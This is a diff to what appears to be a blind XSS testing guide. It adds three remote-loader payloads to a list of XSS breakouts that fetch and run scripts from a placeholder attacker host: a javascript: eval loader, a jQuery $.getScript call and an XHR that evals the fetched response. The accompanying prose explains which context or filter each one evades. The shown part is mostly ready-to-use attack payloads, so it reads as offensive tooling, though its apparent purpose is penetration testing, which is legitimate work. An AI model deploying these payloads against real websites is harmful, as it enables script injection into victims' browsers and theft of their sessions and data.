@@ -99,9 +99,12 @@ You can't see the markup, so you can't tailor the breakout. Two strategies:
   "><script src=//<ATTACKER>/f2></script>
   '><script src=//<ATTACKER>/f3></script>
   <img src=x onerror="s=document.createElement('script');s.src='//<ATTACKER>/f4.js';document.body.appendChild(s)">
+  javascript:eval('var a=document.createElement("script");a.src="//<ATTACKER>/f5";document.body.appendChild(a)')
+  <script>$.getScript("//<ATTACKER>/f6")</script>
+  <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",b);a.open("GET","//<ATTACKER>/f7");a.send()</script>
   ```
 
-  The callback path (`f1`…`f4`) tells you which breakout succeeded as well as which field. The fourth uses a handler to inject a *classic* `<script>` element for `innerHTML` sinks (which ignore bare `<script>`). Prefer this over `import('//…')`: a dynamic `import()` is an ES-module fetch that requires the hosted file to be served with CORS headers (`Access-Control-Allow-Origin`) and a JavaScript MIME type, which a quick `php -S` / `python -m http.server` does not send by default - so `import()` can produce a request that never executes. A classic script element has no such CORS requirement.
+  The callback path (`f1`…`f4`) tells you which breakout succeeded as well as which field. The fourth uses a handler to inject a *classic* `<script>` element for `innerHTML` sinks (which ignore bare `<script>`). Prefer this over `import('//…')`: a dynamic `import()` is an ES-module fetch that requires the hosted file to be served with CORS headers (`Access-Control-Allow-Origin`) and a JavaScript MIME type, which a quick `php -S` / `python -m http.server` does not send by default - so `import()` can produce a request that never executes. A classic script element has no such CORS requirement. The `javascript:` form (`f5`) fits `href`/URL contexts; `$.getScript` (`f6`) is a one-liner where the page already loads jQuery; and the `XMLHttpRequest` + `eval(this.responseText)` form (`f7`) fetches your payload and evals it, slipping through where a literal `<script src>` is filtered but an XHR to your host isn't.
 - **Prefer a remote script over an inline payload.** Keep the injected value tiny and put all logic in the hosted script, so you can change what the payload *does* without re-injecting. Blind XSS succeeds most often where you can guess the context least - so lean on the loader and iterate server-side.
 
 <Aside type="note">
